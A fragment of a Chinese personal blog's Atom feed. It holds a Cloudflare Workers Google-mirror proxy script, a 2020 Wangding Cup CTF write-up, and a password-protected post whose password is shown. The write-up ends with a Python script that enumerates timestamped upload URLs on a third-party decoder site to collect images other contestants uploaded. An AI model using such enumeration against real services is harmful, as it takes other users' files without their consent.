blocked_ip_address = [&#39;0.0.0.0&#39;, &#39;127.0.0.1&#39;]// Whether to use HTTPS protocol for upstream address.const https = true// Whether to disable cache.const disable_cache = true// Replace texts.const replace_dict = {    &#39;$upstream&#39;: &#39;$custom_domain&#39;,    &#39;//google.com&#39;: &#39;&#39;}addEventListener(&#39;fetch&#39;, event =&gt; {    event.respondWith(fetchAndApply(event.request));})async function fetchAndApply(request) {​    const region = request.headers.get(&#39;cf-ipcountry&#39;).toUpperCase();​    const ip_address = request.headers.get(&#39;cf-connecting-ip&#39;);​    const user_agent = request.headers.get(&#39;user-agent&#39;);​    ​    let response = null;​    let url = new URL(request.url);​    let url_hostname = url.hostname;​    ​    if (https == true) {​        url.protocol = &#39;https:&#39;;​    } else {​        url.protocol = &#39;http:&#39;;​    }​    ​    if (await device_status(user_agent)) {​        var upstream_domain = upstream;​    } else {​        var upstream_domain = upstream_mobile;​    }​    ​    url.host = upstream_domain;​    if (url.pathname == &#39;/&#39;) {​        url.pathname = upstream_path;​    } else {​        url.pathname = upstream_path + url.pathname;​    }​    ​    if (blocked_region.includes(region)) {​        response = new Response(&#39;Access denied: WorkersProxy is not available in your region yet.&#39;, {​            status: 403​        });​    } else if (blocked_ip_address.includes(ip_address)) {​        response = new Response(&#39;Access denied: Your IP address is blocked by WorkersProxy.&#39;, {​            status: 403​        });​    } else {​        let method = request.method;​        let request_headers = request.headers;​        let new_request_headers = new Headers(request_headers);​    ​        new_request_headers.set(&#39;Host&#39;, url.hostname);​        new_request_headers.set(&#39;Referer&#39;, url.hostname);​    ​        let original_response = await fetch(url.href, {​            method: method,​            headers: new_request_headers​        })​    ​        let original_response_clone = original_response.clone();​        let original_text = null;​        let response_headers = original_response.headers;​        let new_response_headers = new Headers(response_headers);​        let status = original_response.status;​        ​        if (disable_cache) {​            new_response_headers.set(&#39;Cache-Control&#39;, &#39;no-store&#39;);​        }​    ​        new_response_headers.set(&#39;access-control-allow-origin&#39;, &#39;*&#39;);​        new_response_headers.set(&#39;access-control-allow-credentials&#39;, true);​        new_response_headers.delete(&#39;content-security-policy&#39;);​        new_response_headers.delete(&#39;content-security-policy-report-only&#39;);​        new_response_headers.delete(&#39;clear-site-data&#39;);​        ​        if(new_response_headers.get(&quot;x-pjax-url&quot;)) {​            new_response_headers.set(&quot;x-pjax-url&quot;, response_headers.get(&quot;x-pjax-url&quot;).replace(&quot;//&quot; + upstream_domain, &quot;//&quot; + url_hostname));​        }​        ​        const content_type = new_response_headers.get(&#39;content-type&#39;);​        if (content_type.includes(&#39;text/html&#39;) &amp;&amp; content_type.includes(&#39;UTF-8&#39;)) {​            original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);​        } else {​            original_text = original_response_clone.body​        }​        ​        response = new Response(original_text, {​            status,​            headers: new_response_headers​        })​    }​    return response;}async function replace_response_text(response, upstream_domain, host_name) {    let text = await response.text()​    var i, j;​    for (i in replace_dict) {​        j = replace_dict[i]​        if (i == &#39;$upstream&#39;) {​            i = upstream_domain​        } else if (i == &#39;$custom_domain&#39;) {​            i = host_name​        }​    ​        if (j == &#39;$upstream&#39;) {​            j = upstream_domain​        } else if (j == &#39;$custom_domain&#39;) {​            j = host_name​        }​    ​        let re = new RegExp(i, &#39;g&#39;)​        text = text.replace(re, j);​    }​    return text;}async function device_status(user_agent_info) {    var agents = [&quot;Android&quot;, &quot;iPhone&quot;, &quot;SymbianOS&quot;, &quot;Windows Phone&quot;, &quot;iPad&quot;, &quot;iPod&quot;];    var flag = true;    for (var v = 0; v &lt; agents.length; v++) {        if (user_agent_info.indexOf(agents[v]) &gt; 0) {            flag = false;            break;        }    }    return flag;}</code></pre><p>左上角项目名可以修改</p><p>然后点击保存并部署就可以了 可以先点击右边的预览查看效果</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511095402.jpg" alt="QQ截图20200511095402"></p><p>可以返回首页点击workers来管理</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511095646.jpg" alt="QQ截图20200511095646"></p><p>下面是我创建的镜像</p><p><a href="http://gg.d1a0.workers.dev/" target="_blank" rel="noopener">http://gg.d1a0.workers.dev/</a></p><p>虽然Cloudflare Workers 每天只有10万次免费的请求 ,不过也够个人使用了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天在群里看到大佬弄的谷歌镜像站，于是也学着部署了一份&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>2020网鼎杯青龙组部分wp</title>
    <link href="http://lingxin16.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/"/>
    <id>http://lingxin16.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/</id>
    <published>2020-05-10T13:10:22.000Z</published>
    <updated>2020-05-11T01:00:06.850Z</updated>
    
    <content type="html"><![CDATA[<p>第一次参加网鼎杯，作为一个萌新，这次我们队只做出来了两道题，全程都在解哪个汉信码，最后也没解出来，我太菜了，555…</p><a id="more"></a><h2 id="misc签到"><a href="#misc签到" class="headerlink" title="misc签到"></a>misc签到</h2><p>misc签到题给的是个web容器，打开链接</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510210516.jpg" alt="QQ截图20200510210516"></p><p>根据上方战队名选择战队图片，有三次错误机会，猜的时间是十秒</p><p>当连续猜对15次之后需要输入战队token</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510210711.jpg" alt="QQ截图20200510210711"></p><p>输入token后在控制台找到flag</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510210731.jpg" alt="QQ截图20200510210731"></p><h2 id="crypto-boom"><a href="#crypto-boom" class="headerlink" title="crypto boom"></a>crypto boom</h2><p>下载后是个boom.exe 放在cmd中运行</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510211622.jpg" alt="QQ截图20200510211622"></p><p>根据提示，解一次md5，输入结果</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510211814.jpg" alt="QQ截图20200510211814"></p><p>然后解三元一次方程</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510212119.jpg" alt="QQ截图20200510212119"></p><p>再解出x后得到flag(由于不会解，可以直接爆破得到x)</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510212054.jpg" alt="QQ截图20200510212054"></p><h2 id="crypto-you-raise-me-up"><a href="#crypto-you-raise-me-up" class="headerlink" title="crypto you raise me up"></a>crypto you raise me up</h2><p>下载附件后解压是个py脚本</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *import randomn = 2 ** 512m = random.randint(2, n-1) | 1c = pow(m, bytes_to_long(flag), n)print &#39;m = &#39; + str(m)print &#39;c = &#39; + str(c)# m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075# c = 66658513942032142458567894507236586325208167916217967759097668952330002340</code></pre><p>可以sage工具的discrete_log解</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510215003.jpg" alt="QQ截图20200510215003"></p><p>discrete_log(mod(c,n),mod(m,n))得56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E5%9B%BE%E7%89%8720200511085512.png" alt="QQ图片20200511085512"></p><p>然后用libnum模块解n2s</p><pre><code class="python">import libnumflag = 56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757print (libnum.n2s(flag))</code></pre><p>得到flag</p><h2 id="misc-虚幻二"><a href="#misc-虚幻二" class="headerlink" title="misc 虚幻二"></a>misc 虚幻二</h2><p>今天差不多全程都在解这个题，实在是不知道怎么拼出汉信码</p><p>下载完附件后用Stegsolve分析，保存green，red和blue三个图层</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/green.png" alt="green"></p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/red.png" alt="red"></p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/blue.png" alt="blue"></p><p>看不清可以放大处理一下</p><p>其中red和blue都是31 * 10的排列 green是31 * 11的排列方式，那么从green开始，按照green、blue、red循环的方式，每次用一行进行拼接，得到一个31  * 31的图像  然后需要将左上角7 * 7的方块旋转180°，再将整个图像逆时针旋转90° ，旋转之后图片上方有个7 * 10大小的空白区域，就是hint中所说的暴力恢复的地方</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510214431.jpg" alt="QQ截图20200510214431"></p><p>恢复之后如下图</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510214441.jpg" alt="QQ截图20200510214441"></p><p>在线扫码得到flag</p><p>扫码地址:<a href="http://www.efittech.com/hxdec.html" target="_blank" rel="noopener">http://www.efittech.com/hxdec.html</a></p><p>赛后还听说有的战队是直接爬了解码网站，把其他队伍上传的汉信码都爬了下来…emm</p><p>我研究了下确实是可行的，于是在<a href="https://www.cnblogs.com/anweilx/" target="_blank" rel="noopener">@anweilx</a>师傅的指导下也写了批量爬取的脚本在这里贴出来</p><pre><code class="Python">#coding:utf–8import requestsfor m in range (0,61):#取0分到60分    for s in range (0,61):    #取0秒到60秒        url=&quot;http://www.efittech.com/upload/pics/pic_2020051013&quot; + &quot;%02d%02d&quot;%(m ,s )+&quot;.jpg&quot;        #2020051013是时间格式13是13点        获取=requests.get(url)#获取网络请求信息        #获取网络图片二进制流        流=获取.content        #将二进制流保存到图片文件中        if b&quot;\xff\xd8&quot; in 流:        #判断该图片是否存在            file = open(&quot;./汉信码13/&quot; + &quot;%02d%02d&quot;%(m ,s ) +&quot;.jpg&quot;,&quot;wb&quot;)            #将图片命名为分钟+秒数.jpg            file.write(流)            file.close()</code></pre><p>第一次写，写的不好师傅们轻点打</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E5%9B%BE%E7%89%8720200511085611.jpg" alt="QQ图片20200511085611"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次参加网鼎杯，作为一个萌新，这次我们队只做出来了两道题，全程都在解哪个汉信码，最后也没解出来，我太菜了，555…&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>hexo博客添加文章访问密码</title>
    <link href="http://lingxin16.github.io/2020/05/07/hexo%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E8%AE%BF%E9%97%AE%E5%AF%86%E7%A0%81/"/>
    <id>http://lingxin16.github.io/2020/05/07/hexo%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E8%AE%BF%E9%97%AE%E5%AF%86%E7%A0%81/</id>
    <published>2020-05-07T10:16:42.000Z</published>
    <updated>2020-05-07T11:53:43.117Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">密码123456</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="c424235f0116965c045ec9272bd30cbaa99d71895d570e5710a3fa3a508a4b18">037923a29417dcb57ea278bc904620b7af2caafecbc18a8abcbcb385f4cdb2d9d3fe01425ed8362f1b3775e0f857e6058c4d5366f118747e1bfd1c8489f143eccd0c996f9a06c092b4508b2dc146418255243800bf0a1faded9760885d8a1568efbb32e59a42cf0ecb82c09a9e6f6866dc222a339ff7abdc9acbdc7082934e387c2304681a7210578c032eb4c7781fb4119094557060cb3de8230f6e96e96bd6551892c02329d3f90aa9d061ff25518d8be11dcc15deda07c0ad33a8e727962a339a56cddabb23472049594048036af94c3a75cfbb49b12a7567a2b752c90bd91a1628f4b635164b0b52366e47ac18441fb8bba5a9eaad776e7fae49f7d75b75ac85d84ab4a17edf97c146c862d329f17bfd6a22bbacecf0ee88964dd472bf0c55bd57e08919d719bfa4bac82a26fa056281b0fb429645b4f4f74a4ef9af2680</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      密码123456
    
    </summary>
    
    
    
      <category term="博客搭建" scheme="http://lingxin16.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
</feed>
